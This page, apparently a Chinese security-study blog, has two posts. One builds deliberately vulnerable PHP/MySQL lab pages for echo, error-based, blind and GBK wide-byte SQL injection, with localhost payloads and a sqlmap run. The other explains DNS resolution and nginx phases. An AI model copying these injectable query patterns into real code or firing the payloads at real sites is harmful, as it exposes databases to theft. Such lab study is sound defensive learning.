      <meta itemprop="name" content="Darren-zl">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Darren-学无止境">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/06/各种注入类型的环境搭建和代码编写/" itemprop="url">各种注入类型的环境搭建和代码编写</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-06T13:55:34+08:00">
                2019-10-06
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
              <span class="post-meta-divider">|</span>
              <span class="post-meta-item-icon">
                <i class="fa fa-comment-o"></i>
              </span>
              
                <a href="/2019/10/06/各种注入类型的环境搭建和代码编写/#SOHUCS" itemprop="discussionUrl">
                  <span id="url::http://yoursite.com/2019/10/06/各种注入类型的环境搭建和代码编写/" class="cy_cmt_count" data-xid="2019/10/06/各种注入类型的环境搭建和代码编写/" itemprop="commentsCount"></span>
                </a>
              
            
          

          
          
             <span id="/2019/10/06/各种注入类型的环境搭建和代码编写/" class="leancloud_visitors" data-flag-title="各种注入类型的环境搭建和代码编写">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">Visitors&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  
                </span>
              
            </div>
          

          

        </span></div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">


      
      

      
        
          
            <h2 id="第十周-各种注入类型的环境搭建和代码编写"><a href="#第十周-各种注入类型的环境搭建和代码编写" class="headerlink" title="第十周-各种注入类型的环境搭建和代码编写"></a>第十周-各种注入类型的环境搭建和代码编写</h2><p><strong>环境：mysql5.7.26+Apache2.4.39+php5.2</strong></p>
<h4 id="1-回显注入"><a href="#1-回显注入" class="headerlink" title="1.回显注入"></a>1.回显注入</h4><p>回显注入是sql相关的查询信息，错误信息均能回显到页面中。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'12345678'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</span><br><span class="line">mysql_query(<span class="string">"SET NAMES binary'"</span>);</span><br><span class="line">mysql_select_db(<span class="string">'yuangong'</span>, $conn) <span class="keyword">OR</span> emMsg(<span class="string">"数据库连接失败"</span>);</span><br><span class="line"><span class="comment">//这里id没有做整形转换</span></span><br><span class="line">$id = <span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) ? $_GET[<span class="string">'id'</span>] : <span class="number">1</span>;</span><br><span class="line"><span class="comment">//sql语句没有单引号保护,造成注入</span></span><br><span class="line"><span class="keyword">echo</span> $sql = <span class="string">"SELECT * FROM workers WHERE id=&#123;$id&#125;"</span>;</span><br><span class="line">$result = mysql_query($sql, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error()); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"zh-CN"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">	&lt;title&gt;员工表&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;boby&gt;</span><br><span class="line">&lt;h2&gt;员工表&lt;/h2&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> $row = mysql_fetch_array($result, MYSQL_ASSOC);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3&gt;&#123;$row['title']&#125;&lt;/h3&gt;&lt;p&gt;&#123;$row['content']&#125;&lt;p&gt;\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> mysql_free_result($result);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/boby&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1570189144065.png" alt="1570189144065"></p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1570189270984.png" alt="1570189270984"></p>
<h4 id="2-错误注入"><a href="#2-错误注入" class="headerlink" title="2.错误注入"></a>2.错误注入</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'12345678'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</span><br><span class="line">mysql_query(<span class="string">"SET NAMES binary'"</span>);</span><br><span class="line">mysql_select_db(<span class="string">'yuangong'</span>, $conn) <span class="keyword">OR</span> emMsg(<span class="string">"数据库连接失败"</span>);</span><br><span class="line"><span class="comment">//这里id没有做整形转换</span></span><br><span class="line">$id = <span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) ? $_GET[<span class="string">'id'</span>] : <span class="number">1</span>;</span><br><span class="line"><span class="comment">//sql语句没有单引号保护,造成注入</span></span><br><span class="line">$sql = <span class="string">"SELECT * FROM workers WHERE id=&#123;$id&#125;"</span>;</span><br><span class="line">$result = mysql_query($sql, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error()); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"zh-CN"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">	&lt;title&gt;员工表&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;boby&gt;</span><br><span class="line">&lt;h2&gt;员工表&lt;/h2&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$row = mysql_fetch_array($result, MYSQL_ASSOC);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3&gt;&#123;$row['title']&#125;&lt;/h3&gt;&lt;p&gt;&#123;$row['content']&#125;&lt;p&gt;\n"</span>;</span><br><span class="line">mysql_free_result($result);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/boby&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>访问<a href="http://127.0.0.1/xinan1.php?id=1页面正常" target="_blank" rel="noopener">http://127.0.0.1/xinan1.php?id=1页面正常</a></p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1570189720646.png" alt="1570189720646"></p>
<p>构造访问<a href="http://127.0.0.1/xinan1.php?id=\" target="_blank" rel="noopener">http://127.0.0.1/xinan1.php?id=\</a> 页面爆出错误意味有报错注入。</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1570189794321.png" alt="1570189794321"></p>
<p>也可以这么构造<a href="http://127.0.0.1/xinan1.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/xinan1.php?id=1</a> and multipoint (()select * from(select user() )1)2 );</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1570193965146.png" alt="1570193965146"></p>
<p>构造访问<a href="http://127.0.0.1/xinan1.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/xinan1.php?id=1</a> and 1=2 order by 6页面正常，访问<a href="http://127.0.0.1/xinan1.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/xinan1.php?id=1</a> and 1=2 order by 7页面错误。意味有6个字段。</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1570190563493.png" alt="1570190563493"></p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1570190655815.png" alt="1570190655815"></p>
<p>用sqlmap进行跑一下：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1570195521565.png" alt="1570195521565"></p>
<h4 id="3-盲注"><a href="#3-盲注" class="headerlink" title="3.盲注"></a>3.盲注</h4><p>盲注不向上面两种，当发现有SQL注入时候，不能得到SQL查询数据的返显。盲注通过服务器返回的状态等各种因素来猜测。</p>
<p>SQL盲注中常用的几个内置函数：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">length(str)：返回str字符串的长度。</span><br><span class="line">substr(str, pos, len)：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始</span><br><span class="line">mid(str,pos,len):跟上面的一样，截取字符串</span><br><span class="line">ascii(str)：返回字符串str的最左面字符的ASCII代码值。</span><br><span class="line">asc();返回字符串str的最左面字符的ASCII代码值。</span><br><span class="line">ord(str):同上，返回ascii码</span><br><span class="line">if(a,b,c) :a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'12345678'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</span><br><span class="line">mysql_query(<span class="string">"SET NAMES binary'"</span>);</span><br><span class="line">mysql_select_db(<span class="string">'yuangong'</span>, $conn) <span class="keyword">OR</span> emMsg(<span class="string">"数据库连接失败"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])) </span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$sql=<span class="string">"SELECT * FROM workers WHERE id=&#123;$id&#125;"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">	<span class="keyword">if</span>($row)    <span class="comment">//如果查到数据就执行如下</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'数据查询成功'</span>;    </span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span>     <span class="comment">//否则执行这个     从两者返回的网页结构不一样，就可以作为我们盲注条件判断的依据</span></span><br><span class="line">    &#123;</span><br><span class="line">	  <span class="keyword">echo</span> <span class="string">'数据查询失败'</span>;</span><br><span class="line">	  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"zh-CN"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">	&lt;title&gt;员工表&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;boby&gt;</span><br><span class="line">&lt;h2&gt;员工表&lt;/h2&gt;</span><br><span class="line">&lt;/boby&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>正常页面：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1570197354995.png" alt="1570197354995"></p>
<p>错误页面：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1570197383661.png" alt="1570197383661"></p>
<h4 id="4-宽字节注入"><a href="#4-宽字节注入" class="headerlink" title="4.宽字节注入"></a>4.宽字节注入</h4><p>​        宽字节注入源于程序员设置MySQL连接时错误配置为：set character_set_client=gbk，这样配置会引发编码转换从而导致的注入漏洞。</p>
<p>​        如果存在宽字节注入，我们输入%df%27时，经过转译变成了%df%5c%27（%5c是反斜杠\），之后在数据库查询前由于使用了GBK多字节编码，即在汉字编码范围内两个字节会被编码为一个汉字。然后MySQL服务器会对查询语句进行GBK编码即%df%5c转换成了汉字“運”（具体见GBK的汉字编码范围见附录），而单引号逃逸了出来，从而造成了注入漏洞。</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1570203659620.png" alt="1570203659620"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html; charset=utf-8"</span>); <span class="comment">//将页面设置为utf-8</span></span><br><span class="line">$conn = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'12345678'</span>);</span><br><span class="line">mysql_select_db(<span class="string">"yuangong"</span>, $conn);</span><br><span class="line">mysql_query(<span class="string">"SET NAMES GBK"</span>, $conn);	<span class="comment">//不安全的编码方式</span></span><br><span class="line"> </span><br><span class="line">$id = addslashes($_GET[<span class="string">'id'</span>]);			<span class="comment">//不安全的转义函数</span></span><br><span class="line">$sql = <span class="string">"select * from workers where id='$id'"</span>;</span><br><span class="line">$query = mysql_query($sql, $conn);</span><br><span class="line"><span class="keyword">if</span>($query == <span class="keyword">True</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		$result = mysql_fetch_array($query);</span><br><span class="line">		$username = $result[<span class="string">"username"</span>];</span><br><span class="line">		$email = $result[<span class="string">"email"</span>];</span><br><span class="line"> </span><br><span class="line">		print_r(<span class="string">'用户名： '</span> . $username . <span class="string">'&lt;br /&gt;'</span>);</span><br><span class="line">		print_r(<span class="string">'邮  箱： '</span> . $email . <span class="string">'&lt;br /&gt;'</span>);</span><br><span class="line">		$sql = mb_convert_encoding($sql, <span class="string">"UTF-8"</span>, <span class="string">"GBK"</span>);</span><br><span class="line">		print_r(<span class="string">'&lt;br /&gt;SQL语句：'</span> . $sql);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">mysql_close($conn);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"zh-CN"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">	&lt;title&gt;员工表&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;boby&gt;</span><br><span class="line">&lt;h2&gt;员工表&lt;/h2&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$row = mysql_fetch_array($result, MYSQL_ASSOC);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3&gt;&#123;$row['title']&#125;&lt;/h3&gt;&lt;p&gt;&#123;$row['content']&#125;&lt;p&gt;\n"</span>;</span><br><span class="line">mysql_free_result($result);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/boby&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>构建URL:<a href="http://127.0.0.1/xinan1.php?id=1%df%27" target="_blank" rel="noopener">http://127.0.0.1/xinan1.php?id=1%df%27</a> and 1=1 %23</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1570204003665.png" alt="1570204003665"></p>
<h5 id="参考链接：https-www-jianshu-com-p-e3c5233a3c42"><a href="#参考链接：https-www-jianshu-com-p-e3c5233a3c42" class="headerlink" title="参考链接：https://www.jianshu.com/p/e3c5233a3c42"></a>参考链接：<a href="https://www.jianshu.com/p/e3c5233a3c42" target="_blank" rel="noopener">https://www.jianshu.com/p/e3c5233a3c42</a></h5>
          
        
      
    </div>
    
    
    



    

    

    



    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/30/web页面解析流程学习/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Darren-zl">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Darren-学无止境">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/09/30/web页面解析流程学习/" itemprop="url">web页面解析流程学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-30T10:55:34+08:00">
                2019-09-30
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
              <span class="post-meta-divider">|</span>
              <span class="post-meta-item-icon">
                <i class="fa fa-comment-o"></i>
              </span>
              
                <a href="/2019/09/30/web页面解析流程学习/#SOHUCS" itemprop="discussionUrl">
                  <span id="url::http://yoursite.com/2019/09/30/web页面解析流程学习/" class="cy_cmt_count" data-xid="2019/09/30/web页面解析流程学习/" itemprop="commentsCount"></span>
                </a>
              
            
          

          
          
             <span id="/2019/09/30/web页面解析流程学习/" class="leancloud_visitors" data-flag-title="web页面解析流程学习">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">Visitors&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  
                </span>
              
            </div>
          

          

        </span></div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">


      
      

      
        
          
            <h2 id="web页面解析流程学习–第九周"><a href="#web页面解析流程学习–第九周" class="headerlink" title="web页面解析流程学习–第九周"></a>web页面解析流程学习–第九周</h2><h2 id="1-理解域名解析的整个过程"><a href="#1-理解域名解析的整个过程" class="headerlink" title="1.理解域名解析的整个过程"></a>1.理解域名解析的整个过程</h2><p>​       一个域名“<a href="http://www.baidu.com.”由4部分：第1部分“.”代表根服务器、第2部分“.com.”代表顶级域名服务器、第3部分“baidu.com.”代表域名所有者服务器、第4部分“www.baidu.com.”代表主机域名" target="_blank" rel="noopener">www.baidu.com.”由4部分：第1部分“.”代表根服务器、第2部分“.com.”代表顶级域名服务器、第3部分“baidu.com.”代表域名所有者服务器、第4部分“www.baidu.com.”代表主机域名</a></p>
<p>​       域名体系是一个分级体系，最高级是根服务器，最低级是本地服务器（如114.114.114.114），域名查询需要逐级递归查询。</p>
<ol>
<li><p>当浏览器输入一个地址如:<a href="http://www.baidu.com，首先浏览器会检测自身缓存中有没有没解析过该域名的IP，如果有解析结束直接访问IP。同时域名缓存的时间可以用过TTL属性来设置。" target="_blank" rel="noopener">www.baidu.com，首先浏览器会检测自身缓存中有没有没解析过该域名的IP，如果有解析结束直接访问IP。同时域名缓存的时间可以用过TTL属性来设置。</a></p>
</li>
<li><p>如果浏览器缓存中没有命中该域名的IP，浏览器会检测系统的缓存中（hosts文件）有没有对应已解析的结果。如果你在hosts文件中记录了域名对应的IP，浏览器会优先使用hosts对应的IP。</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1569483681765.png" alt="1569483681765"></p>
</li>
<li><p>如果hosts文件也未命中，便会请求本地域名服务器（LDNS）来解析域名，这台服务器一般在你城市的一个角落，距离你不远并且性能强大，一般都会缓存解析结果。绝大多数域名解析到这步骤就结束了。</p>
</li>
<li><p>如果LDNS仍然没有命中，就直接跳到Root Server域名服务器请求解析。</p>
</li>
<li><p>根域名服务器会返回LDNS一个所查询的主域名服务器gTLD server地址。gTLD是国际顶级域名，如.com、.cn、.org等，全球只有13台。</p>
</li>
<li><p>本地域名服务器（Local DNS Server）再向上一步返回的gTLD服务器发送请求。</p>
</li>
<li><p>接受请求的gTLD服务器查找并返回此域名对应的Name Server域名服务器的地址，这个Name Server通常就是你注册的域名服务器，例如你在某个域名服务提供商申请的域名，那么这个域名解析任务就由这个域名提供商的服务器来完成。</p>
</li>
<li><p>Name Server域名服务器会查询存储的域名和IP的映射关系表，正常情况下都根据域名得到目标IP记录，连同一个TTL值返回给DNS Server域名服务器。</p>
</li>
<li><p>返回该域名对应的IP和TTL，Local DNS Server会缓存这个域名和IP的对应关系，缓存的时间由TTL值控制。</p>
</li>
<li><p>把解析的结果返回给用户，用户根据TTL值缓存在本地系统缓存中，域名解析过程结束。</p>
</li>
</ol>
<h2 id="2-Nginx处理的11个过程"><a href="#2-Nginx处理的11个过程" class="headerlink" title="2. Nginx处理的11个过程"></a>2. Nginx处理的11个过程</h2><p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1569486341255.png" alt="1569486341255"></p>
<h3 id="2-1-对应的11个模块："><a href="#2-1-对应的11个模块：" class="headerlink" title="2.1 对应的11个模块："></a>2.1 对应的11个模块：</h3><table>
<thead>
<tr>
<th>阶段</th>
<th>realip</th>
</tr>
</thead>
<tbody><tr>
<td>POST_READ</td>
<td>realip</td>
</tr>
<tr>
<td>SERVER_REWRITE</td>
<td>rewrite</td>
</tr>
<tr>
<td>FIND_CONFIG</td>
<td></td>
</tr>
<tr>
<td>REWRITE</td>
<td>rewrite</td>
</tr>
<tr>
<td>POST_REWRITE</td>
<td></td>
</tr>
<tr>
<td>PREACCESS</td>
<td>limt_conn,limit_req</td>
</tr>
<tr>
<td>ACCESS</td>
<td>auth_basic,access,auth_request</td>
</tr>
<tr>
<td>POST_ACCESS</td>
<td></td>
</tr>
<tr>
<td>PRECONTENT</td>
<td>try_files</td>
</tr>
<tr>
<td>CONTENT</td>
<td>index,autoindex,concat</td>
</tr>
<tr>
<td>LOG</td>
<td>access_log</td>
</tr>
</tbody></table>
<h3 id="2-2-11阶段处理顺序："><a href="#2-2-11阶段处理顺序：" class="headerlink" title="2.2 11阶段处理顺序："></a>2.2 11阶段处理顺序：</h3><p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1569488455189.png" alt="1569488455189"></p>
<h3 id="2-3-对应脑图："><a href="#2-3-对应脑图：" class="headerlink" title="2.3 对应脑图："></a>2.3 对应脑图：</h3><p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/3501414338-5d63d34385a4d.png" alt="3501414338-5d63d34385a4d"></p>
<h3 id="2-4-各功能模块功能"><a href="#2-4-各功能模块功能" class="headerlink" title="2.4 各功能模块功能"></a>2.4 各功能模块功能</h3><h4 id="2-4-1-realip"><a href="#2-4-1-realip" class="headerlink" title="2.4.1 realip"></a>2.4.1 realip</h4><p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1569488882628.png" alt="1569488882628"></p>
<p>real_ip 只有一个<br>X-Forwarded-For 经过的每一个代理服务器</p>
<h4 id="2-4-2-Rewrite-模块"><a href="#2-4-2-Rewrite-模块" class="headerlink" title="2.4.2 Rewrite 模块"></a>2.4.2 Rewrite 模块</h4><h5 id="2-4-2-1-直接返回的指令-：-不向下执行"><a href="#2-4-2-1-直接返回的指令-：-不向下执行" class="headerlink" title="2.4.2.1 直接返回的指令 ： (不向下执行)"></a>2.4.2.1 直接返回的指令 ： (不向下执行)</h5><ul>
<li><ol>
<li>return</li>
</ol>
</li>
<li><ol>
<li>error_page</li>
</ol>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">return 403;</span><br><span class="line">return 404 &quot;find nothing!&quot;;</span><br><span class="line">1. error_page 404 /404.html;</span><br><span class="line"></span><br><span class="line">2. error_page 500 502 503 504 /50x.html;</span><br><span class="line"></span><br><span class="line">3. error_page 404 =200 /empty.gif;</span><br><span class="line"></span><br><span class="line">4. error_page 404 = /404.php;</span><br><span class="line"></span><br><span class="line">5. location / &#123; </span><br><span class="line">       error_page 404 = @fallback; </span><br><span class="line">   &#125; </span><br><span class="line">   location @fallback &#123; </span><br><span class="line">      proxy_pass http://backend; </span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">6. error_page 403 http://example.com/forbidden.html;</span><br><span class="line"></span><br><span class="line">7. error_page 404 =301 http://example.com/notfound.html;</span><br></pre></td></tr></table></figure>

<ul>
<li>3.rewrite</li>
</ul>
<p>语法 ：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rewrite regex replacement [flag];</span><br></pre></td></tr></table></figure>

<h5 id="2-4-2-2-location"><a href="#2-4-2-2-location" class="headerlink" title="2.4.2.2  location"></a>2.4.2.2  location</h5><p>仅仅匹配URI，忽略参数<br>location ： 目的是匹配选择合适的 server 配置项。</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1569489709728.png" alt="1569489709728"></p>
<h4 id="2-4-3-limit-conn"><a href="#2-4-3-limit-conn" class="headerlink" title="2.4.3 limit_conn"></a>2.4.3 limit_conn</h4><p>在进行请求分析之前，为客户端的连接数做一定的访问限制。<br>为每个connection ，每个客户端的connection 数量</p>
